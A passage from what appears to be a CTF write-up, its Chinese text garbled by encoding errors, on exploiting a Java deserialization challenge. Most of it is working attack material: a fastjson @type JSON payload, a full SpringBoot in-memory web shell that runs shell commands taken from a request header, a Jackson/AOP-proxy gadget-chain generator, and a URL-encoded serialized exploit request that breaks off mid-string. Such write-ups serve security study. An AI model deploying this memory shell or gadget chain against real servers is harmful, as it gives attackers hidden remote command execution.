ä½ä½œç”¨ã€‚è¿™ä¹ˆåšçš„åŸå› æ˜¯<code>HashMap</code>æœ¬èº«å°±ä¸å…è®¸é‡å¤é”®ï¼Œæ­£å¥½è¢«<code>HashSet</code>æ‹¿æ¥ç”¨ã€‚</p><pre><code>    private static final Object PRESENT = new Object();    public boolean add(E e) &#123;        return map.put(e, PRESENT)==null;    &#125;</code></pre><p>æ‰€ä»¥ç›´æ¥ç»™<code>map</code>çš„<code>key</code>èµ‹å€¼ååºåˆ—åŒ–æ•°æ®å°±å¯ä»¥äº†ã€‚</p><pre><code>&#123;&quot;@type&quot;:&quot;ctf.nese.SecurityCheck&quot;,&quot;safe&quot;:false,&quot;treeMap&quot;:&#123;&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:&#123;&quot;ååºåˆ—åŒ–å­—ç¬¦ä¸²&quot;:&quot;&quot;&#125;&#125;&#125;</code></pre><p>æ³¨æ„<code>base64</code>æœ‰ä¸€äº›è„å­—ç¬¦ï¼Œ<code>url</code>ç¼–ç å³å¯ã€‚</p><h4 id="å†…å­˜é©¬æ”»å‡»"><a href="#å†…å­˜é©¬æ”»å‡»" class="headerlink" title="å†…å­˜é©¬æ”»å‡»"></a>å†…å­˜é©¬æ”»å‡»</h4><p>ç¯å¢ƒä¸å‡ºç½‘ï¼Œ<code>Springboot</code>ä¾èµ–æ³¨å…¥å†…å­˜é©¬å³å¯ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">.</span>memshell<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>ServletRequestAttributes<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span>PatternsRequestCondition<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span>RequestMethodsRequestCondition<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringBootMemoryShellOfController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Integer i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 1. åˆ©ç”¨springå†…éƒ¨æ–¹æ³•è·å–context</span>        WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2. ä»contextä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹</span>        RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span> <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­çš„ Method å¯¹è±¡</span>        Method method <span class="token operator">=</span> SpringBootMemoryShellOfController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span>HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span>        RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/test2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            SpringBootMemoryShellOfController springBootMemoryShellOfController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springBootMemoryShellOfController<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span>String test<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">boolean</span> isLinux <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            String osTyp <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>osTyp <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> osTyp<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                isLinux <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> isLinux <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            InputStream in <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Scanner s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äº<code>JackSon</code>çš„<code>exp</code>æˆ‘æ˜¯ç›´æ¥æŠ„çš„ç½‘ä¸Šé€šè¿‡<code>AOPProxy</code>è§£å†³<code>jackson</code>é“¾ä¸ç¨³å®šçš„ç‰ˆæœ¬ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">;</span><span class="token keyword">import</span> gadget<span class="token punctuation">.</span>memshell<span class="token punctuation">.</span>SpringBootMemoryShellOfController<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>GadgetUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>SerializerUtils<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Jackson</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);</span><span class="token comment" spellcheck="true">//        final Object template = GadgetUtils.templatesImplLocalWindows();</span>        CtClass ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtMethod writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// å°†ä¿®æ”¹åçš„CtClassåŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­</span>        ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span><span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        POJONode node = new POJONode(template);</span>        BadAttributeValueExpException val <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field valfield <span class="token operator">=</span> val<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><span class="token comment" spellcheck="true">//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);</span><span class="token comment" spellcheck="true">//        oos.writeObject(val);</span><span class="token comment" spellcheck="true">//        SerializerUtils.unserialize(SerializerUtils.serialize(val));</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> Object template <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>SpringBootMemoryShellOfController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxy <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”»å‡»ï¼š</p><pre><code>classes=org.springframework.core.annotation.AnnotationAttributes&amp;obj=%7B%22%40type%22%3A%22com.example.jackson.SecurityCheck%22%2C%22safe%22%3Afalse%2C%22treeMap%22%3A%7B%22%40type%22%3A%22java.util.HashSet%22%2C%22map%22%3A%7B%22rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAInQADmdhZGdldC5KYWNrc29udAAMSmFja3Nvbi5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB%2BABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAARaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7WwARcHJveGllZEludGVyZmFjZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAFWgALcHJlRmlsdGVyZWRMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB%2BAAdMAAppbnRlcmZhY2VzcQB%2BAAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS%2FPmp%2BD3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5VN1kN%2BJOcfcCAAB4cHNxAH4AFAAAAAB3BAAAAAB4c3EAfgAUAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH%2BPq6AgABTAAGdGFyZ2V0cQB%2BAA